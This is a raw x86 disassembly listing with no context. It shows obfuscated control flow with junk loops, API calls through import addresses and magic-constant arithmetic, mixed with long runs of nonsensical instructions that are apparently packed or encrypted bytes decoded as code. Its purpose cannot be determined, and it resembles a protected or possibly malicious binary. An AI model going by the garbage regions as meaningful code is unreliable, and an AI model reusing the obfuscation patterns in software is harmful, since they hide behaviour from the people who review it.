  407bb4:	and    DWORD PTR ds:0x43366b,0x1370
  407bbe:	lea    eax,[ebp-0xc]
  407bc1:	xor    edx,DWORD PTR ds:0x4336d7
  407bc7:	mov    DWORD PTR [ebp-0x10],eax
  407bca:	and    eax,eax
  407bcc:	mov    eax,DWORD PTR [ebp-0x10]
  407bcf:	mov    DWORD PTR ds:0x433657,0x11
  407bd9:	cmp    DWORD PTR ds:0x433657,0x0
  407be0:	je     0x407c31
  407be6:	cmp    DWORD PTR ds:0x433657,0x6
  407bed:	jne    0x407c03
  407bf3:	push   0x578e
  407bf8:	push   0x5398
  407bfd:	call   DWORD PTR ds:0x41229c
  407c03:	cmp    DWORD PTR ds:0x433657,0x7
  407c0a:	jne    0x407c1f
  407c10:	xor    edx,edx
  407c12:	add    edx,DWORD PTR ds:0x433657
  407c18:	dec    edx
  407c19:	mov    DWORD PTR ds:0x433657,edx
  407c1f:	mov    edx,DWORD PTR ds:0x433657
  407c25:	dec    edx
  407c26:	mov    DWORD PTR ds:0x433657,edx
  407c2c:	jmp    0x407bd9
  407c31:	mov    edx,DWORD PTR [eax]
  407c33:	imul   edx,edx,0xf89ea9ee
  407c39:	jmp    0x407e61
  407c3e:	and    BYTE PTR [edi-0x2b],al
  407c41:	out    0x71,al
  407c43:	je     0x407c76
  407c45:	inc    ecx
  407c46:	adc    al,0x2f
  407c48:	sbb    ecx,esi
  407c4a:	mov    edx,0x2bd822df
  407c4f:	int3   
  407c50:	jle    0x407cd0
  407c52:	add    eax,0xd17e7e7c
  407c57:	push   0xffffffda
  407c59:	ss in  eax,0x15
  407c5c:	mov    WORD PTR [edx-0x3],ds
  407c5f:	fscale 
  407c61:	sbb    bl,al
  407c63:	in     al,0x8
  407c65:	or     ax,0x61e7
  407c69:	inc    eax
  407c6a:	addr16 xchg dh,cl
  407c6d:	dec    ebx
  407c6e:	mov    edx,0x897e9076
  407c73:	sub    eax,0x391fbb3f
  407c78:	add    BYTE PTR [ecx+edi*8-0x32],ah
  407c7c:	and    BYTE PTR [ebx+0x3a472baa],0x9c
  407c83:	xlat   BYTE PTR ds:[ebx]
  407c84:	dec    edx
  407c85:	dec    esp
  407c86:	out    0x30,eax
  407c88:	ds nop
  407c8a:	xabort 0x24
  407c8d:	xchg   esp,eax
  407c8e:	stos   DWORD PTR es:[edi],eax
  407c8f:	jno    0x407c48
  407c91:	pop    esi
  407c92:	mov    ebp,?
  407c94:	mov    ah,0xc
  407c96:	dec    esi
  407c97:	and    ch,ah
  407c99:	xchg   ecx,eax
  407c9a:	aad    0x4e
  407c9c:	mov    ch,0xa5
  407c9e:	lds    edi,FWORD PTR [edi-0x4f]
  407ca1:	sbb    bh,ah
  407ca3:	das    
  407ca4:	mov    esp,0x64f168d1
  407ca9:	push   es
  407caa:	mov    al,0xd2
  407cac:	pop    esp
  407cad:	xor    al,0x2e
  407caf:	inc    ebx
  407cb0:	mov    dl,0xa
  407cb2:	sub    al,0x64
  407cb4:	dec    esp
  407cb5:	or     BYTE PTR ds:0xbfbfc657,dl
  407cbb:	inc    edx
  407cbc:	mov    esp,edi
  407cbe:	mov    edx,0x87c34a25
  407cc3:	ds jl  0x407c70
  407cc6:	jge    0x407d12
  407cc8:	stc    
  407cc9:	pop    esp
  407cca:	int    0x3c
  407ccc:	and    ah,BYTE PTR [edx-0x75]
  407ccf:	test   eax,0x6c350e18
  407cd4:	shl    DWORD PTR [edx],1
  407cd6:	or     ecx,ebx
  407cd8:	imul   eax,DWORD PTR [edi],0xcd4ddcc
  407cde:	cmp    eax,0x342df15b
  407ce3:	or     DWORD PTR [ecx],edx
  407ce5:	mov    bl,0x43
  407ce7:	add    eax,0xb1cc5473
  407cec:	aam    0xc9
  407cee:	rol    BYTE PTR [edx],1
  407cf0:	inc    ebp
  407cf1:	call   0xd195:0x79618bc4
  407cf8:	pop    esp
  407cf9:	sbb    eax,DWORD PTR [edi+0x29899e8d]
  407cff:	repz and ah,BYTE PTR [ebx]
  407d02:	jbe    0x407d53
  407d04:	xor    DWORD PTR [edx-0x226f6861],0x1c84a757
  407d0e:	leave  
  407d0f:	imul   edi,esp,0xe519d706
  407d15:	fwait
  407d16:	hlt    
  407d17:	fwait
  407d18:	pop    ss
  407d19:	(bad)  
  407d1a:	stos   DWORD PTR es:[edi],eax
  407d1b:	dec    ecx
  407d1c:	or     ebx,DWORD PTR [edi-0x35ffcb9d]
  407d22:	jno    0x407cad
  407d24:	jge    0x407cbc
  407d26:	addr16 pushf 
  407d28:	add    al,0xbb
  407d2a:	mov    dl,BYTE PTR [esi]
  407d2c:	xchg   DWORD PTR [eax],esi
  407d2e:	stos   BYTE PTR es:[edi],al
  407d2f:	in     al,dx
  407d30:	dec    eax
  407d31:	(bad)  
  407d32:	scas   al,BYTE PTR es:[edi]
  407d33:	xor    DWORD PTR [esp+edi*1-0xddc14a9],edx
  407d3a:	nop
  407d3b:	in     eax,dx
  407d3c:	sbb    DWORD PTR [ebp-0x5beefee3],ebx
  407d42:	add    DWORD PTR [ebx+esi*4-0x1],0xa25330f4
  407d4a:	mov    esp,esi
  407d4c:	add    esi,eax
  407d4e:	xor    ebx,DWORD PTR [eax-0x35502bd7]
  407d54:	add    al,0xf0
  407d56:	lods   al,BYTE PTR ds:[esi]
  407d57:	mov    bh,0x81
  407d59:	into   
  407d5a:	sub    esp,DWORD PTR [esi]
  407d5c:	pop    ebx
  407d5d:	sbb    al,BYTE PTR [ebx+0x9f48040]
  407d63:	jae    0x407db8
  407d65:	jg     0x407ce7
  407d67:	fcmovbe st,st(5)
  407d69:	mov    cl,0x8
  407d6b:	sbb    ah,ch
  407d6d:	das    
  407d6e:	stos   DWORD PTR es:[edi],eax
  407d6f:	inc    ebx
  407d70:	jnp    0x407d0f
  407d72:	dec    ecx
  407d73:	and    eax,edx
  407d75:	loope  0x407d50
  407d77:	mov    edi,DWORD PTR [ebp-0x3a]
  407d7a:	dec    ecx
  407d7b:	out    0x9c,eax
  407d7d:	js     0x407de1
  407d7f:	push   ds
  407d80:	pop    ds
  407d81:	nop
  407d82:	fmul   DWORD PTR [ecx+esi*1]
  407d85:	fdivr  st,st(4)
  407d87:	mov    esp,0x2411e6e5
  407d8c:	pop    eax
  407d8d:	loopne 0x407d4d
  407d8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407d90:	and    esi,DWORD PTR ds:0xf0ad984d
  407d96:	cmp    BYTE PTR [eax+0x7cd2bcac],bl
  407d9c:	jo     0x407d5b
  407d9e:	pop    eax
  407d9f:	jae    0x407d98
  407da1:	jg     0x407db4
  407da3:	(bad)  
  407da4:	js     0x407d44
  407da6:	mov    ch,BYTE PTR [esi]
  407da8:	sti    
  407da9:	inc    edx
  407daa:	bnd jl 0x407de2
  407dad:	jge    0x407da4
  407daf:	dec    esp
  407db0:	mov    ds:0x327edbc7,eax
  407db5:	jg     0x407d5b
  407db7:	mov    eax,gs
  407db9:	sub    edi,ebx
  407dbb:	in     eax,dx
  407dbc:	rcl    BYTE PTR es:[ebx-0x65],0xfc
  407dc1:	fsub   QWORD PTR ds:0xdb88f72b
  407dc7:	push   ebp
  407dc8:	mov    ebp,0x6e50a98e
  407dcd:	pop    ds
  407dce:	push   ss
  407dcf:	test   DWORD PTR [ecx-0x66],eax
  407dd2:	popa   
  407dd3:	clc    
  407dd4:	push   ss
  407dd5:	add    BYTE PTR [edx],bh
  407dd7:	fld    TBYTE PTR [esi+edi*1+0x4de7076a]
  407dde:	(bad)  [ebp+0x4]
  407de1:	test   DWORD PTR [ecx],edi
  407de3:	and    eax,DWORD PTR [esi]
  407de5:	ins    BYTE PTR es:[edi],dx
  407de6:	pop    es
  407de7:	retf   0xc902
  407dea:	xor    eax,0x3794fd25
  407def:	ret    
  407df0:	sub    al,0xe8
  407df2:	jg     0x407e09
  407df4:	push   ss
  407df5:	ins    DWORD PTR es:[edi],dx
  407df6:	cdq    
  407df7:	inc    ecx
  407df8:	scas   al,BYTE PTR es:[edi]
  407df9:	dec    edx
  407dfa:	push   cs
  407dfb:	and    BYTE PTR [ecx],0xa2
  407dfe:	(bad)  
  407dff:	fist   WORD PTR [edx+0x3b]
  407e02:	sub    edx,DWORD PTR [edx]
  407e04:	cmp    DWORD PTR [esi-0x723d6a64],0x9b0422d8
  407e0e:	pushf  
  407e0f:	and    DWORD PTR [edx-0x308b8249],eax
  407e15:	mov    bh,0x34
  407e18:	dec    eax
  407e19:	sub    eax,0x9cc3d433
  407e1e:	jae    0x407e53
  407e20:	mov    WORD PTR [eax-0x7a9299d4],gs
  407e26:	jle    0x407ea4
  407e28:	adc    ah,dh
  407e2a:	(bad)  
  407e2b:	fstp   QWORD PTR [ecx-0x2e5020fe]
  407e31:	(bad)  
  407e32:	sub    dh,BYTE PTR [ecx]
  407e34:	xchg   esi,eax
  407e35:	dec    edx
  407e36:	les    esp,FWORD PTR [edx+0x2e]
  407e39:	adc    DWORD PTR [ecx],eax
  407e3b:	inc    ebp
  407e3c:	(bad)  
  407e3d:	imul   eax,DWORD PTR [esi+0x62bc63fd],0x65
  407e44:	jp     0x407eb6
  407e46:	xchg   esp,eax
  407e47:	(bad)  [ecx-0x2b36aaca]
  407e4d:	ja     0x407e5e
  407e4f:	pop    es
  407e50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407e51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407e52:	not    DWORD PTR [edx+0x4cd79940]
  407e58:	push   esi
  407e59:	push   ecx
  407e5a:	push   ecx
  407e5b:	mov    edi,eax
  407e5d:	add    DWORD PTR cs:0x8b10897f,0xf23df445
  407e68:	and    DWORD PTR [edi],esi
  407e6a:	or     BYTE PTR [edi],0x84
  407e6d:	pop    ss
  407e6e:	add    BYTE PTR [eax],al
  407e70:	add    BYTE PTR [ebx+0x881e445],cl
  407e76:	sahf   
  407e77:	sbb    al,0x75
  407e79:	pusha  
  407e7a:	mov    eax,DWORD PTR [ebp-0x8]
  407e7d:	xor    eax,ecx
  407e7f:	add    eax,esi
  407e81:	pop    edi
  407e82:	pop    esi
  407e83:	pop    ebx
  407e84:	leave  
  407e85:	ret    0x4
  407e88:	mov    eax,DWORD PTR [ebp-0xc]
  407e8b:	add    eax,DWORD PTR [ebp-0x18]
  407e8e:	cmp    eax,0x7ad64f9b
  407e93:	je     0x407ea7
  407e99:	mov    eax,DWORD PTR [ebp-0x10]
  407e9c:	and    DWORD PTR [eax],0x751c99
  407ea2:	jmp    0x407e7a
  407ea7:	mov    eax,DWORD PTR [ebp-0xc]
  407eaa:	mov    edx,DWORD PTR [ebp-0x18]
  407ead:	or     eax,edx
  407eaf:	cmp    eax,0xfabf2dfb
  407eb4:	je     0x407ec8
  407eba:	mov    eax,DWORD PTR [ebp-0x10]
  407ebd:	xor    DWORD PTR [eax],0x2650fa8f
  407ec3:	jmp    0x407e7a
  407ec8:	mov    ax,WORD PTR [ebp-0x4]
  407ecc:	mov    edi,DWORD PTR [ebp+0x8]
  407ecf:	mov    edi,DWORD PTR [edi]
  407ed1:	mov    edx,0x8a3c
  407ed6:	xor    ax,dx
  407ed9:	mov    edx,0x3b02
  407ede:	add    ax,dx
  407ee1:	cmp    ax,WORD PTR [edi]
  407ee4:	je     0x407f31
  407eea:	mov    eax,DWORD PTR [ebp-0x14]
  407eed:	xor    eax,ecx
  407eef:	add    eax,esi
  407ef1:	mov    DWORD PTR [ebp-0x24],eax
  407ef4:	mov    eax,DWORD PTR [ebp-0x28]
  407ef7:	mov    di,WORD PTR [ebp-0x2c]
  407efb:	mov    ebx,0x8a3c
  407f00:	xor    di,bx
  407f03:	add    di,dx
  407f06:	movzx  edx,di
  407f09:	mov    edi,DWORD PTR [ebp-0x8]
  407f0c:	xor    edi,ecx
  407f0e:	lea    edx,[edx+edi*1+0x32729b]
  407f15:	add    DWORD PTR [eax],edx
  407f17:	mov    eax,DWORD PTR [ebp-0x20]
  407f1a:	mov    edx,DWORD PTR [ebp-0x8]
  407f1d:	mov    edi,DWORD PTR [ebp-0x24]
  407f20:	xor    edx,ecx
  407f22:	add    edx,esi
  407f24:	imul   edx,edi
  407f27:	sub    DWORD PTR [eax],edx
  407f29:	mov    eax,DWORD PTR [ebp-0x14]
  407f2c:	jmp    0x407e7d
  407f31:	mov    eax,DWORD PTR [ebp-0xc]
  407f34:	mov    edx,DWORD PTR [ebp-0x18]
  407f37:	xor    eax,edx
  407f39:	cmp    eax,0x7aa80c5b
  407f3e:	je     0x407e7a
  407f44:	mov    eax,DWORD PTR [ebp-0x10]
  407f47:	add    DWORD PTR [eax],0x7403501
  407f4d:	jmp    0x407e7a
  407f52:	mov    eax,DWORD PTR [ebp-0x1c]
  407f55:	cmp    DWORD PTR [eax],edi
  407f57:	je     0x407e7a
  407f5d:	mov    eax,0x800f1c9a
  407f62:	jmp    0x407e81
  407f67:	push   ebp
  407f68:	mov    ebp,esp
  407f6a:	sub    esp,0x20
  407f6d:	adc    ecx,eax
  407f6f:	mov    eax,ds:0x413b34
  407f74:	mov    eax,DWORD PTR [eax+0x198]
  407f7a:	movzx  ecx,BYTE PTR ds:0x43366b
  407f81:	or     DWORD PTR ds:0x43366f,ecx
  407f87:	mov    DWORD PTR [ebp-0x8],eax
  407f8a:	or     DWORD PTR ds:0x4336d7,0x6995
  407f94:	mov    eax,DWORD PTR [ebp+0x8]
  407f97:	mov    ecx,DWORD PTR [ebp-0x8]
  407f9a:	or     DWORD PTR ds:0x4336d3,0x2a5
  407fa4:	push   ebx
  407fa5:	xor    ebx,ebx
  407fa7:	xor    ebx,DWORD PTR ds:0x43371b
  407fad:	sub    DWORD PTR ds:0x4336a7,ebx
  407fb3:	push   esi
  407fb4:	mov    esi,0x7510854
  407fb9:	sub    ebx,DWORD PTR ds:0x43365b
  407fbf:	xor    eax,esi
  407fc1:	and    DWORD PTR ds:0x4336ab,0x0
  407fcb:	jmp    0x407fdd
  407fd0:	mov    ebx,DWORD PTR ds:0x4336ab
  407fd6:	inc    ebx
  407fd7:	mov    DWORD PTR ds:0x4336ab,ebx
  407fdd:	cmp    DWORD PTR ds:0x4336ab,0x17
  407fe4:	jae    0x408024
  407fea:	cmp    DWORD PTR ds:0x4336ab,0x7
  407ff1:	jne    0x408005
  407ff7:	push   0x4338e7
  407ffc:	push   DWORD PTR [ebp-0x10]
  407fff:	call   DWORD PTR ds:0x4120d4
  408005:	cmp    DWORD PTR ds:0x4336ab,0x6
  40800c:	jne    0x40801f
  408012:	mov    ebx,DWORD PTR ds:0x4336ab
  408018:	inc    ebx
  408019:	mov    DWORD PTR ds:0x4336ab,ebx
  40801f:	jmp    0x407fd0
  408024:	push   edi
  408025:	neg    ebx
  408027:	mov    edi,0x32729b
  40802c:	and    DWORD PTR ds:0x4336ab,0x0
  408036:	jmp    0x408048
  40803b:	mov    ebx,DWORD PTR ds:0x4336ab
  408041:	inc    ebx
  408042:	mov    DWORD PTR ds:0x4336ab,ebx
  408048:	cmp    DWORD PTR ds:0x4336ab,0x1c
  40804f:	jae    0x408092
  408055:	cmp    DWORD PTR ds:0x4336ab,0x9
  40805c:	jne    0x40806d
  408062:	push   0x214e
  408067:	call   DWORD PTR ds:0x4122a0
  40806d:	cmp    DWORD PTR ds:0x4336ab,0x8
  408074:	jne    0x408087
  40807a:	mov    ebx,DWORD PTR ds:0x4336ab
  408080:	inc    ebx
  408081:	mov    DWORD PTR ds:0x4336ab,ebx
  408087:	jmp    0x40803b
  40808c:	sub    ebx,0x76f3
  408092:	add    eax,edi
  408094:	mov    DWORD PTR [ecx],eax
  408096:	add    DWORD PTR ds:0x4335fb,0x1c72
  4080a0:	lea    eax,[ebp-0x4]
  4080a3:	not    ebx
  4080a5:	mov    DWORD PTR [ebp-0x10],eax
  4080a8:	mov    eax,DWORD PTR [ebp+0x8]
  4080ab:	mov    ebx,DWORD PTR ds:0x4336db
  4080b1:	and    DWORD PTR ds:0x4336e3,ebx
  4080b7:	mov    ecx,DWORD PTR [ebp-0x10]
  4080ba:	and    DWORD PTR ds:0x43369b,0x5cf4
  4080c4:	xor    eax,esi
  4080c6:	add    eax,edi
  4080c8:	mov    DWORD PTR [ecx],eax
  4080ca:	and    DWORD PTR ds:0x433723,0x0
  4080d4:	xor    ebx,ebx
  4080d6:	or     ebx,DWORD PTR ds:0x433723
  4080dc:	inc    ebx
  4080dd:	mov    DWORD PTR ds:0x433723,ebx
  4080e3:	cmp    DWORD PTR ds:0x433723,0x8
  4080ea:	jne    0x408101
  4080f0:	push   DWORD PTR [ebp-0x10]
  4080f3:	push   0x4336db
  4080f8:	push   DWORD PTR [ebp-0x1c]
  4080fb:	call   DWORD PTR ds:0x412350
  408101:	cmp    DWORD PTR ds:0x433723,0x7
  408108:	jne    0x40811d
  40810e:	xor    ebx,ebx
  408110:	add    ebx,DWORD PTR ds:0x433723
  408116:	inc    ebx
  408117:	mov    DWORD PTR ds:0x433723,ebx
  40811d:	cmp    DWORD PTR ds:0x433723,0x1a
  408124:	jb     0x4080d4
  40812a:	mov    DWORD PTR [ebp-0x14],0xf89c8531
  408131:	mov    DWORD PTR ds:0x433717,0x1f
  40813b:	cmp    DWORD PTR ds:0x433717,0x0
  408142:	je     0x40817a
  408148:	cmp    DWORD PTR ds:0x433717,0x23
  40814f:	jne    0x408168
  408155:	push   DWORD PTR [ebp-0x1c]
  408158:	push   0x3614
  40815d:	push   0x7
  40815f:	push   DWORD PTR [ebp-0xc]
  408162:	call   DWORD PTR ds:0x4120d8
  408168:	mov    ecx,DWORD PTR ds:0x433717
  40816e:	dec    ecx
  40816f:	mov    DWORD PTR ds:0x433717,ecx
  408175:	jmp    0x40813b
  40817a:	lea    eax,[ebp-0x14]
  40817d:	jmp    0x4083c4
  408182:	ss xor esi,ebp
  408185:	lods   eax,DWORD PTR ds:[esi]
  408186:	jmp    0xc3f1f6fc
  40818b:	push   es
  40818c:	mov    ebp,0xa8c4b20d
  408191:	leave  
  408192:	ds retf 0x7e7e
  408196:	and    al,0x7c
  408198:	jle    0x408218
  40819a:	adc    esp,DWORD PTR ds:0x14aa3d01
  4081a0:	loopne 0x408190
  4081a2:	or     DWORD PTR [ecx-0x54],esi
  4081a5:	pop    esp
  4081a6:	cld    
  4081a7:	rol    DWORD PTR [esp+eax*2],cl
  4081aa:	and    edx,eax
  4081ac:	or     bh,bh
  4081ae:	cdq    
  4081af:	adc    al,0xab
  4081b1:	lea    esp,[ebx+0x72]
  4081b4:	outs   dx,BYTE PTR ds:[esi]
  4081b5:	dec    esp
  4081b6:	js     0x40817f
  4081b8:	sub    DWORD PTR [ecx],ebx
  4081ba:	and    BYTE PTR [edx-0x23efafdc],bl
  4081c0:	jp     0x4081b4
  4081c2:	jecxz  0x408230
  4081c4:	inc    ebp
  4081c5:	or     DWORD PTR [ebp+0x4f08bc81],ecx
  4081cb:	mov    al,0x7
  4081cd:	enter  0x7042,0x26
  4081d1:	xchg   edi,eax
  4081d2:	fwait
  4081d3:	jecxz  0x4081b1
  4081d5:	mov    esp,0xfd7e5c04
  4081da:	(bad)  
  4081db:	xchg   ecx,eax
  4081dc:	pop    ebx
  4081dd:	out    0x93,al
  4081df:	mov    eax,ds:0xb52c83bf
  4081e4:	mov    ebp,0x95cd0781
  4081e9:	cmp    dl,dl
  4081eb:	(bad)  
  4081ed:	les    edx,FWORD PTR [edi]
  4081ef:	push   edx
  4081f0:	xor    bl,bh
  4081f2:	xor    dl,cl
  4081f4:	out    dx,al
  4081f5:	adc    BYTE PTR [esi+edx*2+0x300441ad],bh
  4081fc:	arpl   WORD PTR [eax+0x0],di
  4081ff:	and    esi,eax
  408201:	mov    WORD PTR [ecx+edx*2],gs
  408204:	mov    esp,0x65c4777d
  408209:	ss pop esp
  40820b:	pop    edx
  40820c:	out    0xd4,eax
  40820e:	push   ebp
  40820f:	inc    esi
  408210:	mov    ecx,edx
  408212:	adc    eax,0xf84dddff
  408217:	dec    edx
  408218:	mov    edi,0xaae6cd3c
  40821d:	popf   
  40821e:	sbb    ecx,DWORD PTR [esi+0x5aa842aa]
  408224:	jl     0x4081eb
  408226:	mov    bl,0x80
  408228:	sub    al,0x5b
  40822a:	je     0x408288
  40822c:	aaa    
  40822d:	jmp    0x68b67c52
  408232:	mov    dh,0x9a
  408234:	sbb    al,0x62
  408236:	push   ecx
  408237:	call   0x89ef:0xa1062cae
  40823e:	or     al,0x27
  408240:	hlt    
  408241:	pop    ss
  408242:	gs ss mov ah,0x3f
  408246:	jp     0x408251
  408248:	dec    edi
  408249:	test   eax,0x2fe25101
  40824e:	cmp    ebp,ecx
  408250:	pop    ss
  408251:	adc    al,0xd3
  408253:	arpl   WORD PTR [ebx+eax*2-0x7c],sp
  408257:	push   es
  408258:	cli    
  408259:	imul   edi,DWORD PTR [eax+eiz*4+0x17df7bd],0xffffffcc
  408261:	call   FWORD PTR [eax+0x2b]
  408264:	sub    eax,0x7366dc40
  408269:	(bad)  
  40826a:	sbb    al,al
  40826c:	es out dx,al
  40826e:	pop    ebp
  40826f:	mov    edi,0xdbaff225
  408274:	dec    esp
  408275:	je     0x40820b
  408277:	mov    al,0x4b
  408279:	jbe    0x40824a
  40827b:	dec    edi
  40827c:	cmp    eax,0xb231e569
  408281:	sahf   
  408282:	sub    cl,BYTE PTR [esi]
  408284:	and    BYTE PTR [ecx+0x59f7e9a3],dl
  40828a:	and    DWORD PTR [eax],ebx
  40828c:	fwait
  40828d:	daa    
  40828e:	ja     0x408217
  408290:	outs   dx,DWORD PTR ds:[esi]
  408291:	std    
  408292:	imul   ebp,DWORD PTR [ecx+0x68],0xffffffd1
  408296:	push   ebx
  408297:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408298:	push   ebp
  408299:	lea    eax,[ebp-0x506a8c7b]
  40829f:	aaa    
  4082a0:	hlt    
  4082a1:	int3   
  4082a2:	out    dx,al
  4082a3:	mov    ebx,0xde090d88
  4082a8:	cdq    
  4082a9:	stc    
  4082aa:	dec    esp
  4082ab:	loopne 0x408268
  4082ad:	clc    
  4082ae:	int3   
  4082af:	call   0xd784:0x2000e01a
  4082b6:	cmc    
  4082b7:	pop    eax
  4082b8:	loope  0x408296
  4082ba:	ins    BYTE PTR es:[edi],dx
  4082bb:	imul   edi,DWORD PTR [ecx],0x42
  4082be:	stos   DWORD PTR es:[edi],eax
  4082bf:	mov    edx,0xebeff3d2
  4082c4:	and    ebp,eax
  4082c6:	cmp    dl,al
  4082c8:	(bad)  
  4082c9:	out    0x33,al
  4082cb:	fisubr DWORD PTR ds:0x6b1e1434
  4082d1:	or     ch,ah
  4082d3:	dec    ebp
  4082d4:	fldl2t 
  4082d6:	pcmpeqb mm7,QWORD PTR [eax+ebx*1+0x16]
  4082db:	imul   BYTE PTR [edi]
  4082dd:	adc    BYTE PTR [ebx-0x243b08e3],dl
  4082e3:	mov    eax,0x28585c01
  4082e8:	clc    
  4082e9:	bound  edi,QWORD PTR [ebp+0x66]
  4082ec:	loop   0x4082a6
  4082ee:	or     al,0x14
  4082f0:	push   0x1f0eb75c
  4082f5:	inc    edi
  4082f6:	adc    eax,0x8edb83e1
  4082fb:	icebp  
  4082fc:	xchg   ebp,eax
  4082fd:	xor    edi,DWORD PTR [eax+0x59]
  408300:	adc    al,0x8e
  408302:	add    dh,al
  408304:	ds (bad) 
  408306:	xor    DWORD PTR fs:[eax],esp
  408309:	add    ah,dl
  40830b:	cmp    eax,0x5687fd0a
  408310:	and    edx,DWORD PTR [ecx-0x164c9a2c]
  408316:	jb     0x4082ab
  408318:	sahf   
  408319:	fwait
  40831a:	ja     0x40837c
  40831c:	mov    esi,0xba2d25e9
  408321:	out    dx,al
  408322:	loopne 0x40830f
  408324:	(bad)  
  408325:	arpl   WORD PTR [edx-0x8],ax
  408328:	push   0x33337db7
  40832d:	jge    0x40831c
  40832f:	jmp    0xec7d5298
  408334:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408335:	xor    BYTE PTR [esi+0x32],ch
  408338:	cmp    eax,0x9771e31e
  40833d:	in     eax,dx
  40833e:	ins    DWORD PTR es:[edi],dx
  40833f:	jo     0x408348
  408341:	call   DWORD PTR [ebp+0x34ddd9fc]
  408347:	dec    ebp
  408348:	cmc    
  408349:	inc    edx
  40834a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40834b:	int3   
  40834c:	jns    0x408395
  40834e:	xchg   ecx,eax
  40834f:	push   edx
  408350:	rcl    BYTE PTR [esi-0x40],cl
  408353:	mov    bh,0xcf
  408355:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408356:	pop    edx
  408357:	test   DWORD PTR [edi],ebp
  408359:	push   ebp
  40835a:	add    eax,0xcf18ce5f
  40835f:	inc    ebp
  408360:	xchg   esp,eax
  408361:	mov    ss,ecx
  408363:	inc    edx
  408364:	sti    
  408365:	dec    edi
  408366:	xor    dl,ah
  408368:	xor    edx,edi
  40836a:	call   0x9cba:0x7060156b
  408371:	iret   
  408372:	sbb    eax,0xa6745ed2
  408377:	jo     0x408386
  408379:	push   es
  40837a:	das    
  40837b:	xchg   ecx,eax
  40837c:	int    0x5a
  40837e:	int    0x4
  408380:	xor    eax,0x6bb0789e
  408385:	aas    
  408386:	(bad)  
  408387:	xchg   ebp,eax
  408388:	adc    al,0xb9
  40838a:	test   ah,0xd
  40838d:	pushf  
  40838e:	pop    es
  40838f:	jb     0x4083d4
  408391:	xchg   edi,edx
  408393:	add    bl,dh
  408395:	sbb    ebx,DWORD PTR [esi+eiz*8+0x2c]
  408399:	mov    cl,0xf0
  40839b:	fbld   TBYTE PTR [ecx+0x3e]
  40839e:	dec    esi
  40839f:	nop
  4083a0:	inc    ebx
  4083a1:	mov    eax,0xed278ff5
  4083a6:	sbb    bl,BYTE PTR [eax-0x264a4c60]
  4083ac:	and    al,0x2e
  4083ae:	push   ds
  4083af:	mov    ecx,0x750170bd
  4083b4:	add    ecx,ebx
  4083b6:	daa    
  4083b7:	fcomp  QWORD PTR [edx]
  4083b9:	inc    esp
  4083ba:	cld    
  4083bb:	inc    eax
  4083bc:	and    al,0x10
  4083be:	mov    dh,0x47
  4083c0:	adc    BYTE PTR [edx+ecx*4],dl
  4083c3:	xlat   BYTE PTR ds:[ebx]
  4083c4:	mov    DWORD PTR [ebp-0x20],eax
  4083c7:	and    DWORD PTR ds:0x43365b,0x0
  4083d1:	mov    eax,ds:0x43365b
  4083d6:	inc    eax
  4083d7:	mov    ds:0x43365b,eax
  4083dc:	cmp    DWORD PTR ds:0x43365b,0x6
  4083e3:	jne    0x4083f7
  4083e9:	push   DWORD PTR [ebp-0x20]
  4083ec:	push   0x3975
  4083f1:	call   DWORD PTR ds:0x412354
  4083f7:	cmp    DWORD PTR ds:0x43365b,0x5
  4083fe:	jne    0x408412
  408404:	xor    eax,eax
  408406:	or     eax,DWORD PTR ds:0x43365b
  40840c:	inc    eax
  40840d:	mov    ds:0x43365b,eax
  408412:	cmp    DWORD PTR ds:0x43365b,0x19
  408419:	jb     0x4083d1
  40841f:	inc    ebx
  408420:	mov    eax,DWORD PTR [ebp-0x14]
  408423:	or     DWORD PTR ds:0x43360b,0x6df5
  40842d:	mov    ecx,DWORD PTR [ebp-0x20]
  408430:	xor    ebx,0x4a96
  408436:	xor    eax,esi
  408438:	add    ebx,0x7cb
  40843e:	add    eax,edi
  408440:	xor    DWORD PTR ds:0x433613,ecx
  408446:	mov    DWORD PTR [ecx],eax
  408448:	mov    eax,ds:0x413c08
  40844d:	adc    ebx,DWORD PTR ds:0x433727
  408453:	jmp    0x40869a
  408458:	xchg   BYTE PTR [ebp-0x19],bl
  40845b:	inc    ebx
  40845c:	in     eax,0x41
  40845e:	mov    ds:0x7a26859,al
  408463:	das    
  408464:	mov    DWORD PTR [edx-0x371b3a34],edi
  40846a:	jle    0x4084ea
  40846c:	and    al,0x7c
  40846e:	jle    0x4084ee
  408470:	cmp    ebp,DWORD PTR [edi]
  408472:	mov    esi,0x951bff20
  408477:	pop    edx
  408478:	psubq  mm5,QWORD PTR [ebp-0x49088558]
  40847f:	aad    0xea
  408481:	push   esp
  408482:	or     al,0xd3
  408484:	sbb    ecx,ecx
  408486:	fst    QWORD PTR [edi+0x1]
  408489:	mov    ebx,0xfd1e0e60
  40848e:	xchg   DWORD PTR [edi-0x4a],esp
  408491:	imul   esp,DWORD PTR [edx],0x19
  408494:	(bad)  
  408495:	(bad)  
  408496:	dec    eax
  408497:	mov    ah,0x92
  408499:	pusha  
  40849a:	bound  esp,QWORD PTR [edx]
  40849c:	int3   
  40849d:	sub    al,0x91
  40849f:	cli    
  4084a0:	mov    ecx,0x2c8bba51
  4084a5:	push   esi
  4084a6:	mov    dh,bl
  4084a8:	push   ebp
  4084a9:	mov    dh,0x81
  4084ab:	pop    ecx
  4084ac:	sbb    cl,dh
  4084ae:	sbb    eax,0xba9375bf
  4084b3:	inc    eax
  4084b4:	outs   dx,BYTE PTR ds:[esi]
  4084b5:	push   ebx
  4084b6:	(bad)  
  4084b7:	pushf  
  4084b8:	leave  
  4084b9:	push   edx
  4084ba:	or     bh,dl
  4084bc:	adc    al,0xe6
  4084be:	inc    eax
  4084bf:	cmp    bh,BYTE PTR [edx+edx*1-0x6c]
  4084c3:	cmp    eax,DWORD PTR [edi+0x7f]
  4084c6:	repz sub al,BYTE PTR ss:[edi-0x15ddf400]
  4084ce:	mov    ch,0xe9
  4084d0:	inc    esp
  4084d1:	ret    
  4084d2:	sar    BYTE PTR [edi],0xbf
  4084d5:	push   ss
  4084d6:	lods   al,BYTE PTR ds:[esi]
  4084d7:	aam    0x41
  4084d9:	push   0x2f
  4084db:	retf   
  4084dc:	xor    DWORD PTR [edi+0x5725dc3e],ebx
  4084e2:	dec    ebx
